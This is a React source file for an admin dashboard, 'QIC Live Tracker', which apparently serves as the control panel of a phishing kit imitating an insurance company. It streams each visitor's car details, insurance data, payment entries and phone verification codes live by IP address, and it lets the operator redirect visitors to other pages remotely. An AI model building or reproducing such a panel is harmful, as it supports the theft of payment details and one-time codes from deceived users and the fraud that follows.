import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { io } from 'socket.io-client';
import { LogOut, Users, Eye, Flag, Navigation, Trash2 } from 'lucide-react';
import '../styles/AdminTracker.css';

const SOCKET_URL = import.meta.env.VITE_SOCKET_URL || 'http://localhost:4000';

export default function AdminTracker() {
  const navigate = useNavigate();
  const [socket, setSocket] = useState(null);
  const [connected, setConnected] = useState(false);
  const [users, setUsers] = useState([]);
  const [allData, setAllData] = useState({});
  const [selectedUser, setSelectedUser] = useState(null);

  useEffect(() => {
    // Check authentication
    const isAuth = sessionStorage.getItem('adminAuthenticated');
    if (!isAuth) {
      navigate('/admin/login');
      return;
    }

    // Connect to Socket.IO
    const newSocket = io(SOCKET_URL, {
      transports: ['websocket', 'polling'],
      auth: { token: sessionStorage.getItem('adminToken') || 'admin-token' }
    });

    newSocket.on('connect', () => {
      console.log('✅ Admin connected to server');
      setConnected(true);
      // Request all data using new unified system
      newSocket.emit('requestAll', { limit: 10000 });
      // Fallback for old system
      newSocket.emit('loadData');
    });

    newSocket.on('disconnect', () => {
      console.log('❌ Admin disconnected');
      setConnected(false);
    });

    // Listen for bulk entries (new system)
    newSocket.on('bulkEntries', (response) => {
      console.log('📦 Received bulk entries:', response.count, 'records');
      if (response.success && response.entries) {
        // Convert entries to legacy format
        const legacyData = {};
        response.entries.forEach(entry => {
          const page = entry.sourcePage.replace('/', '');
          if (!legacyData[page]) legacyData[page] = [];
          legacyData[page].push(entry.payload);
        });
        setAllData(prev => ({ ...prev, ...legacyData }));
      }
    });

    // Listen for initial data (old system)
    newSocket.on('initialData', (data) => {
      console.log('📦 Received initial data:', data);
      setAllData(data);
      
      // Extract unique users from locations
      if (data.locations) {
        const uniqueUsers = data.locations.map(loc => ({
          ip: loc.ip,
          currentPage: loc.currentPage,
          flag: data.flags?.find(f => f.ip === loc.ip)?.flag || false
        }));
        setUsers(uniqueUsers);
      }
    });

    // Listen for real-time updates
    newSocket.on('locationUpdated', ({ ip, page }) => {
      setUsers(prev => {
        const existing = prev.find(u => u.ip === ip);
        if (existing) {
          return prev.map(u => u.ip === ip ? { ...u, currentPage: page } : u);
        }
        return [...prev, { ip, currentPage: page, flag: false }];
      });
    });

    newSocket.on('flagUpdated', ({ ip, flag }) => {
      setUsers(prev => prev.map(u => u.ip === ip ? { ...u, flag } : u));
    });

    newSocket.on('newCarDetails', (data) => {
      console.log('🚗 New car details:', data);
      setAllData(prev => ({
        ...prev,
        carDetails: [...(prev.carDetails || []), data]
      }));
    });

    newSocket.on('newPayment', (data) => {
      console.log('💳 New payment:', data);
      setAllData(prev => ({
        ...prev,
        payment: [...(prev.payment || []), data]
      }));
    });

    // Listen for all new entries (unified system)
    newSocket.on('newEntryAll', (entry) => {
      console.log('🆕 New entry from', entry.sourcePage, entry);
      const page = entry.sourcePage.replace('/', '');
      setAllData(prev => ({
        ...prev,
        [page]: [...(prev[page] || []), entry.payload]
      }));
    });

    newSocket.on('userDeleted', ({ ip }) => {
      setUsers(prev => prev.filter(u => u.ip !== ip));
      if (selectedUser?.ip === ip) {
        setSelectedUser(null);
      }
    });

    setSocket(newSocket);

    return () => {
      newSocket.close();
    };
  }, [navigate]);

  const handleLogout = () => {
    sessionStorage.clear();
    navigate('/admin/login');
  };

  const toggleFlag = (ip) => {
    if (socket) {
      const user = users.find(u => u.ip === ip);
      const newFlag = !user.flag;
      socket.emit('toggleFlag', { ip, flag: newFlag });
    }
  };

  const navigateUser = (ip, page) => {
    if (socket) {
      socket.emit('navigateTo', { ip, page });
    }
  };

  const deleteUser = async (ip) => {
    if (!confirm(`هل أنت متأكد من حذف المستخدم ${ip}؟`)) return;
    
    try {
      const response = await fetch(`${SOCKET_URL}/api/users/${ip}`, {
        method: 'DELETE'
      });
      const data = await response.json();
      if (data.success) {
        console.log('✅ User deleted');
      }
    } catch (err) {
      console.error('❌ Error deleting user:', err);
    }
  };

  const sendTestEntry = async () => {
    try {
      const res = await fetch(`${SOCKET_URL}/api/submit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sourcePage: '/test-admin',
          payload: {
            ip: '192.168.1.999',
            testMessage: 'Test from AdminTracker',
            timestamp: new Date().toISOString()
          }
        })
      });
      const json = await res.json();
      console.log('📤 Test entry sent:', json);
      alert('✅ تم إرسال بيانات اختبار!');
    } catch(e) {
      alert('❌ خطأ: ' + e.message);
    }
  };

  const getUserData = (ip) => {
    const data = {};
    if (allData.carDetails) {
      data.carDetails = allData.carDetails.filter(d => d.ip === ip);
    }
    if (allData.moreDetails) {
      data.moreDetails = allData.moreDetails.filter(d => d.ip === ip);
    }
    if (allData.selectInsurance) {
      data.selectInsurance = allData.selectInsurance.filter(d => d.ip === ip);
    }
    if (allData.plateNumber) {
      data.plateNumber = allData.plateNumber.filter(d => d.ip === ip);
    }
    if (allData.insuranceInfo) {
      data.insuranceInfo = allData.insuranceInfo.filter(d => d.ip === ip);
    }
    if (allData.policyDate) {
      data.policyDate = allData.policyDate.filter(d => d.ip === ip);
    }
    if (allData.quote) {
      data.quote = allData.quote.filter(d => d.ip === ip);
    }
    if (allData.payment) {
      data.payment = allData.payment.filter(d => d.ip === ip);
    }
    if (allData.phoneCode) {
      data.phoneCode = allData.phoneCode.filter(d => d.ip === ip);
    }
    return data;
  };

  return (
    <div className="admin-tracker">
      <header className="tracker-header">
        <h1>🎯 QIC Live Tracker</h1>
        <div className="header-controls">
          <div className="status-indicator">
            <div className={`status-dot ${connected ? 'connected' : 'disconnected'}`} />
            <span>{connected ? 'متصل' : 'غير متصل'}</span>
          </div>
          <button 
            onClick={() => socket?.emit('requestAll', { limit: 10000 })}
            className="refresh-btn"
            disabled={!connected}
            style={{ marginLeft: '10px', padding: '8px 16px', background: '#10b981', color: 'white', border: 'none', borderRadius: '6px', cursor: connected ? 'pointer' : 'not-allowed', opacity: connected ? 1 : 0.5 }}
          >
            🔄 جلب كل البيانات
          </button>
          <button 
            onClick={async () => {
              try {
                const res = await fetch(`${SOCKET_URL}/api/entries?limit=1000`);
                const json = await res.json();
                console.log('📥 HTTP fetch:', json);
                alert(`تم جلب ${json.count} سجل عبر HTTP`);
              } catch(e) { alert('خطأ: ' + e.message); }
            }}
            className="http-btn"
            style={{ marginLeft: '10px', padding: '8px 16px', background: '#3b82f6', color: 'white', border: 'none', borderRadius: '6px', cursor: 'pointer' }}
          >
            📥 GET Test
          </button>
          <button 
            onClick={sendTestEntry}
            className="post-btn"
            style={{ marginLeft: '10px', padding: '8px 16px', background: '#f59e0b', color: 'white', border: 'none', borderRadius: '6px', cursor: 'pointer' }}
          >
            📤 POST Test
          </button>
          <button onClick={handleLogout} className="logout-btn">
            <LogOut size={18} />
            تسجيل خروج
          </button>
        </div>
      </header>

      <div className="tracker-content">
        <div className="users-panel">
          <div className="panel-header">
            <Users size={20} />
            <h2>المستخدمون النشطون ({users.length})</h2>
          </div>

          <div className="users-list">
            {users.map(user => (
              <div 
                key={user.ip} 
                className={`user-card ${selectedUser?.ip === user.ip ? 'selected' : ''} ${user.flag ? 'flagged' : ''}`}
                onClick={() => setSelectedUser(user)}
              >
                <div className="user-header">
                  <div className="user-ip">{user.ip}</div>
                  <button 
                    onClick={(e) => { e.stopPropagation(); toggleFlag(user.ip); }}
                    className={`flag-btn ${user.flag ? 'active' : ''}`}
                  >
                    <Flag size={16} fill={user.flag ? 'gold' : 'none'} />
                  </button>
                </div>
                <div className="user-page">
                  📍 {user.currentPage === 'offline' ? '❌ Offline' : user.currentPage}
                </div>
                <div className="user-actions">
                  <button onClick={(e) => { e.stopPropagation(); navigateUser(user.ip, '/'); }}>
                    <Navigation size={14} /> الصفحة الرئيسية
                  </button>
                  <button onClick={(e) => { e.stopPropagation(); deleteUser(user.ip); }} className="delete-btn">
                    <Trash2 size={14} /> حذف
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>

        <div className="data-panel">
          <div className="panel-header">
            <Eye size={20} />
            <h2>بيانات المستخدم</h2>
          </div>

          {selectedUser ? (
            <div className="user-data">
              <h3>IP: {selectedUser.ip}</h3>
              
              {Object.entries(getUserData(selectedUser.ip)).map(([key, value]) => (
                value.length > 0 && (
                  <div key={key} className="data-section">
                    <h4>{translateKey(key)}</h4>
                    {value.map((item, idx) => (
                      <div key={idx} className="data-item">
                        <pre>{JSON.stringify(item, null, 2)}</pre>
                      </div>
                    ))}
                  </div>
                )
              ))}

              {Object.keys(getUserData(selectedUser.ip)).every(k => !getUserData(selectedUser.ip)[k]?.length) && (
                <p className="no-data">لا توجد بيانات لهذا المستخدم بعد</p>
              )}
            </div>
          ) : (
            <div className="no-selection">
              <Users size={48} opacity={0.3} />
              <p>اختر مستخدماً لعرض بياناته</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function translateKey(key) {
  const translations = {
    carDetails: '🚗 تفاصيل السيارة',
    moreDetails: '📋 تفاصيل إضافية',
    selectInsurance: '🛡️ اختيار التأمين',
    plateNumber: '🔢 رقم اللوحة',
    insuranceInfo: '👤 معلومات التأمين',
    policyDate: '📅 تاريخ الوثيقة',
    quote: '💰 السعر المعروض',
    payment: '💳 الدفع',
    phoneCode: '📱 كود التحقق'
  };
  return translations[key] || key;
}
